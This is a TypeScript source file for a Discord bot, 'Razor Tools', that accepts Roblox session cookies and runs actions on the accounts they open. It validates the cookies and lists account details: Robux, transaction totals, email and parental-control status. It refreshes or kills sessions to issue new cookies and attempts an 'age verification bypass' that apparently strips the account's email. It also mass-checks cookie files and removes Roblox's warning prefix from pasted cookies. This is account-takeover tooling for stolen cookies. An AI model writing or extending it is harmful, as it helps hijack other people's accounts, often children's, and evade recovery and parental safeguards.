// src/bot/commands/panel.ts
import {
  ActionRowBuilder,
  StringSelectMenuBuilder,
  StringSelectMenuOptionBuilder,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  type MessageComponentInteraction,
  type ModalSubmitInteraction,
  MessageFlags,
  type ChatInputCommandInteraction,
  SlashCommandBuilder,
} from 'discord.js';
import type { Command } from './types';
import * as Roblox from '../../lib/roblox-api';
import {
  buildSuccessEmbed,
  buildErrorEmbed,
  buildInvalidCookieEmbed,
  buildIpLimitEmbed,
  buildProgressEmbed,
  buildBaseEmbed,
} from '../../lib/embed-helpers';
import { buildCopyButtons } from '../../lib/button-helpers';
import { logger } from '../../lib/logger';

const modalSessions = new Map<string, { action: string }>();

export function buildPanelEmbed() {
  return buildBaseEmbed(
    '𖣐 Razor Tools Serving',
    '✧ **Welcome to Razor Tools**\n' +
    '────\n' +
    '⭑ Select an action from the dropdown below.\n' +
    '⭑ You will be asked for credentials and delivery method.\n' +
    '⭑ Results can be sent via DM or posted in this channel.\n' +
    '────\n' +
    '✧ **Commands:**\n' +
    '• Login – Check Account Info\n' +
    '• Refresh – Safe cookie refresh (keeps other sessions)\n' +
    '• Reset – Kill all sessions & get fresh cookie\n' +
    '• Bypass – Emails Removing\n' +
    '• Check – Mass Checks Cookies Inside Files\n' +
    '• Clear – Clear Cookies Format',
    'Razor Tools On Top!'
  );
}

export function buildPanelSelect() {
  const select = new StringSelectMenuBuilder()
    .setCustomId('panel_select')
    .setPlaceholder('Choose an action')
    .addOptions(
      new StringSelectMenuOptionBuilder()
        .setLabel('🔐 Login / Check')
        .setValue('login')
        .setDescription('Validate and show account info'),
      new StringSelectMenuOptionBuilder()
        .setLabel('🔄 Refresh (Safe)')
        .setValue('refresh')
        .setDescription('Refresh cookie without killing other sessions'),
      new StringSelectMenuOptionBuilder()
        .setLabel('🔄 Reset (Kill)')
        .setValue('reset')
        .setDescription('Kill all sessions and get fresh cookie'),
      new StringSelectMenuOptionBuilder()
        .setLabel('⚡ Bypass')
        .setValue('bypass')
        .setDescription('Attempt age verification bypass'),
      new StringSelectMenuOptionBuilder()
        .setLabel('📂 Mass Check')
        .setValue('check')
        .setDescription('Upload a file of cookies (use /check directly)'),
      new StringSelectMenuOptionBuilder()
        .setLabel('🧹 Clear Cookie')
        .setValue('clear')
        .setDescription('Extract raw cookie from messy text')
    );
  return new ActionRowBuilder<StringSelectMenuBuilder>().addComponents(select);
}

function buildAccountEmbedLocal(
  username: string,
  displayName: string | null,
  userId: number,
  ageDays: number,
  robux: number,
  summary: { incoming: number; outgoing: number },
  country: string,
  emailStatus: string,
  parentalStatus: string,
  thumbnail?: string | null
) {
  const ageText = ageDays === -1 ? 'Unknown' : `${ageDays} days`;
  const embed = buildBaseEmbed(
    '𖣐 Cookie Valid .ᐟ',
    `✧ **User Information**\n` +
    `────\n` +
    `⭑ **Username:** ${username}\n` +
    `⭑ **Display Name:** ${displayName || username}\n` +
    `⭑ **User ID:** ${userId}\n` +
    `⭑ **Country:** ${country}\n` +
    `⭑ **Account Age:** ${ageText}\n` +
    `⭑ **Robux:** ${robux.toLocaleString()}\n` +
    `────\n` +
    `✧ **Robux Summary (Year)**\n` +
    `────\n` +
    `⭑ **Incoming:** ${summary.incoming.toLocaleString()}\n` +
    `⭑ **Outgoing:** ${summary.outgoing.toLocaleString()}\n` +
    `────\n` +
    `✧ **Account Details**\n` +
    `────\n` +
    `⭑ **Email:** ${emailStatus}\n` +
    `⭑ **Parental Controls:** ${parentalStatus}\n` +
    `────\n` +
    `⭑ Your credentials were not logged.`
  );
  if (thumbnail) embed.setThumbnail(thumbnail);
  return embed;
}

const data = new SlashCommandBuilder()
  .setName('panel')
  .setDescription('Open the Razor Tools control panel in this channel')
  .setDefaultMemberPermissions('0') as SlashCommandBuilder;

async function execute(interaction: ChatInputCommandInteraction): Promise<void> {
  await interaction.reply({
    embeds: [buildPanelEmbed()],
    components: [buildPanelSelect()],
  });
}

async function handleSelect(interaction: MessageComponentInteraction): Promise<void> {
  if (!interaction.isStringSelectMenu()) return;
  if (interaction.customId !== 'panel_select') return;

  const action = interaction.values[0];
  const userId = interaction.user.id;

  if (action === 'check') {
    await interaction.reply({
      content: '📂 Please use the `/check` command directly to upload a file.\nThis action is not available in the panel.',
      flags: MessageFlags.Ephemeral,
    });
    return;
  }

  const modal = new ModalBuilder()
    .setCustomId(`panel_modal_${action}_${userId}`)
    .setTitle(`Razor Tools – ${action.charAt(0).toUpperCase() + action.slice(1)}`);

  const cookieInput = new TextInputBuilder()
    .setCustomId('cookie')
    .setLabel('Insert The Cookies!')
    .setStyle(TextInputStyle.Paragraph)
    .setRequired(true)
    .setPlaceholder('Insert here...');

  const fields = [cookieInput];

  if (action === 'bypass') {
    const passInput = new TextInputBuilder()
      .setCustomId('password')
      .setLabel('Password')
      .setStyle(TextInputStyle.Short)
      .setRequired(true)
      .setPlaceholder('Insert here...');
    fields.push(passInput);
  }

  const deliveryInput = new TextInputBuilder()
    .setCustomId('delivery')
    .setLabel('Send To S/D? (S - SERVER | D - DM)')
    .setStyle(TextInputStyle.Short)
    .setRequired(true)
    .setValue('S')
    .setPlaceholder('S or D');

  fields.push(deliveryInput);

  const rows = fields.map(f => new ActionRowBuilder<TextInputBuilder>().addComponents(f));
  modal.addComponents(...rows);

  modalSessions.set(`${action}_${userId}`, { action });
  await interaction.showModal(modal);
}

async function handleModal(interaction: ModalSubmitInteraction): Promise<void> {
  const userId = interaction.user.id;
  const parts = interaction.customId.split('_');
  const action = parts[2];
  const sessionKey = `${action}_${userId}`;
  const session = modalSessions.get(sessionKey);
  if (!session) {
    await interaction.reply({ content: 'Session expired. Please open the panel again.', flags: MessageFlags.Ephemeral });
    return;
  }

  const cookie = interaction.fields.getTextInputValue('cookie');
  let password: string | undefined;
  if (action === 'bypass') {
    try {
      password = interaction.fields.getTextInputValue('password');
    } catch {
      password = undefined;
    }
  }

  const deliveryRaw = interaction.fields.getTextInputValue('delivery').toUpperCase().trim();
  const delivery = (deliveryRaw === 'D') ? 'dm' : 'server';

  await interaction.deferReply({ flags: MessageFlags.Ephemeral });

  async function sendResult(content: any) {
    if (delivery === 'dm') {
      try {
        await interaction.user.send(content);
        await interaction.editReply({ content: '✅ Result sent to your DMs.' });
      } catch {
        await interaction.editReply(content);
      }
    } else {
      await interaction.editReply(content);
    }
  }

  try {
    const validation = await Roblox.validateCookie(cookie);
    if (!validation.valid) {
      const embed = validation.isNetworkError ? buildIpLimitEmbed() : buildInvalidCookieEmbed();
      await sendResult({ embeds: [embed] });
      return;
    }

    switch (action) {
      case 'login': {
        const userId = validation.userId!;
        const age = await Roblox.getUserAge(userId);
        const robux = await Roblox.fetchRobux(cookie, String(userId));
        const summary = await Roblox.fetchTransactionTotals(cookie, String(userId));
        const country = await Roblox.fetchCountry(cookie);
        const email = await Roblox.fetchEmailInfo(cookie);
        const parental = await Roblox.fetchParentalControls(cookie);
        const thumb = await Roblox.fetchAvatarThumbnail(String(userId));

        let emailStatus = 'No email found';
        if (email.verified) emailStatus = `✅ Verified: \`${email.verified}\``;
        else if (email.pending) emailStatus = `⏳ Pending: \`${email.pending}\``;

        const parentStatus = parental.hasParent ? '✅ Parent linked' : '❌ No parent linked';

        const embed = buildAccountEmbedLocal(
          validation.username!,
          validation.displayName || null,
          userId,
          age,
          robux,
          summary,
          country,
          emailStatus,
          parentStatus,
          thumb
        );
        await sendResult({ embeds: [embed] });
        break;
      }
      case 'refresh': {
        const result = await Roblox.refreshSession(cookie);
        if (result.success && result.newCookie) {
          const embed = buildSuccessEmbed(
            '✧ **Refresh Successful**\n' +
            `────\n` +
            `⭑ New cookie issued.\n` +
            `⭑ Your other sessions remain active.\n` +
            `⭑ Your credentials were not logged.`
          );
          const id = Math.random().toString(36).slice(2, 10);
          const row = buildCopyButtons(id, 'refresh', result.newCookie, delivery === 'dm');
          await sendResult({ embeds: [embed], components: [row] });
        } else {
          await sendResult({ embeds: [buildErrorEmbed('✧ **Refresh Failed**\n────\n⭑ Could not refresh the session. Please try again later.')] });
        }
        break;
      }
      case 'reset': {
        const result = await Roblox.killAndRefreshSession(cookie);
        if (result.success && result.newCookie) {
          const embed = buildSuccessEmbed(
            '✧ **Reset Successful**\n' +
            `────\n` +
            `⭑ New cookie issued.\n` +
            `⭑ Old session killed.\n` +
            `⭑ Your credentials were not logged.`
          );
          const id = Math.random().toString(36).slice(2, 10);
          const row = buildCopyButtons(id, 'reset', result.newCookie, delivery === 'dm');
          await sendResult({ embeds: [embed], components: [row] });
        } else {
          await sendResult({ embeds: [buildErrorEmbed('✧ **Reset Failed**\n────\n⭑ Could not refresh the session. Please try again later.')] });
        }
        break;
      }
      case 'bypass': {
        if (!password) {
          await sendResult({ embeds: [buildErrorEmbed('✧ **Missing Password**\n────\n⭑ Password is required for bypass.')] });
          break;
        }

        const userId = validation.userId!;
        const age = await Roblox.getUserAge(userId);
        const robux = await Roblox.fetchRobux(cookie, String(userId));
        const summary = await Roblox.fetchTransactionTotals(cookie, String(userId));
        const country = await Roblox.fetchCountry(cookie);
        const email = await Roblox.fetchEmailInfo(cookie);
        const parental = await Roblox.fetchParentalControls(cookie);
        const thumb = await Roblox.fetchAvatarThumbnail(String(userId));

        let emailStatus = 'No email found';
        if (email.verified) emailStatus = `✅ Verified: \`${email.verified}\``;
        else if (email.pending) emailStatus = `⏳ Pending: \`${email.pending}\``;
        const parentStatus = parental.hasParent ? '✅ Parent linked' : '❌ No parent linked';

        if (!email.verified) {
          const embed = buildAccountEmbedLocal(
            validation.username!,
            validation.displayName || null,
            userId,
            age,
            robux,
            summary,
            country,
            emailStatus,
            parentStatus,
            thumb
          );
          await sendResult({ embeds: [embed] });
          break;
        }

        const progressEmbed = buildProgressEmbed('Sending bypass request...');
        await sendResult({ embeds: [progressEmbed] });

        let lastMessage = 'Sending bypass request...';
        let attempts = 0;
        const result = await (async () => {
          let delay = 3000;
          for (let attempt = 1; attempt <= 6; attempt++) {
            attempts = attempt;
            const res = await Roblox.bypassAgeVerification(cookie, password);
            if (res.success) return res;
            if (res.inProgress) {
              lastMessage = `Processing... (attempt ${attempt}/6)`;
              const updateEmbed = buildProgressEmbed(lastMessage);
              await sendResult({ embeds: [updateEmbed] });
              if (attempt < 6) {
                await new Promise(resolve => setTimeout(resolve, delay));
                delay = Math.min(delay * 1.5, 10000);
              }
              continue;
            }
            return res;
          }
          return { success: false, message: 'Still processing, please check later.', timedOut: true };
        })();

        if (result.success) {
          let newCookie = result.newCookie;
          let finalUserId = userId;
          let finalUsername = validation.username!;
          let finalDisplayName = validation.displayName || null;
          let finalAge = age;
          let finalRobux = robux;
          let finalSummary = summary;
          let finalCountry = country;
          let finalEmail = email;
          let finalParental = parental;
          let finalThumb = thumb;

          if (newCookie) {
            const newValidation = await Roblox.validateCookie(newCookie);
            if (newValidation.valid) {
              finalUserId = newValidation.userId!;
              finalUsername = newValidation.username!;
              finalDisplayName = newValidation.displayName || null;
              finalAge = await Roblox.getUserAge(finalUserId);
              finalRobux = await Roblox.fetchRobux(newCookie, String(finalUserId));
              finalSummary = await Roblox.fetchTransactionTotals(newCookie, String(finalUserId));
              finalCountry = await Roblox.fetchCountry(newCookie);
              finalEmail = await Roblox.fetchEmailInfo(newCookie);
              finalParental = await Roblox.fetchParentalControls(newCookie);
              finalThumb = await Roblox.fetchAvatarThumbnail(String(finalUserId));
            } else {
              newCookie = undefined;
            }
          }

          const embed = buildAccountEmbedLocal(
            finalUsername,
            finalDisplayName,
            finalUserId,
            finalAge,
            finalRobux,
            finalSummary,
            finalCountry,
            finalEmail.verified ? `✅ Verified: \`${finalEmail.verified}\`` : 'No email found',
            finalParental.hasParent ? '✅ Parent linked' : '❌ No parent linked',
            finalThumb
          );

          const id = newCookie ? Math.random().toString(36).slice(2, 10) : '';
          const row = newCookie ? buildCopyButtons(id, 'bypass', newCookie, delivery === 'dm') : undefined;
          await sendResult({ embeds: [embed], components: row ? [row] : [] });
        } else if (result.timedOut) {
          const embed = buildProgressEmbed('Bypass is still in progress. Please check later.');
          await sendResult({ embeds: [embed] });
        } else {
          await sendResult({
            embeds: [
              buildErrorEmbed(
                `✧ **Bypass Failed**\n────\n⭑ ${result.message}\n⭑ Your credentials were not logged.`
              ),
            ],
          });
        }
        break;
      }
      case 'clear': {
        const cleaned = Roblox.extractCookie(cookie);
        if (!cleaned) {
          await sendResult({ embeds: [buildErrorEmbed('✧ **No Cookie Found**\n────\n⭑ No valid cookie token found.')] });
        } else {
          const embed = buildSuccessEmbed(
            '✧ **Cleaned Cookie**\n' +
            `────\n` +
            `\`\`\`\n${cleaned}\n\`\`\`\n` +
            `────\n` +
            `⭑ Removed warning prefix and extra text.`
          );
          const id = Math.random().toString(36).slice(2, 10);
          const row = buildCopyButtons(id, 'clear', cleaned, delivery === 'dm');
          await sendResult({ embeds: [embed], components: [row] });
        }
        break;
      }
      default:
        await sendResult({ embeds: [buildErrorEmbed('✧ **Unknown Action**\n────\n⭑ Something went wrong.')] });
    }
  } catch (err: any) {
    logger.error({ err }, 'Panel modal error');
    await sendResult({ embeds: [buildErrorEmbed('✧ **Error**\n────\n⭑ An unexpected error occurred.')] });
  }

  modalSessions.delete(sessionKey);
}

export const panelCommand: Command = { data, execute, handleSelect, handleModal };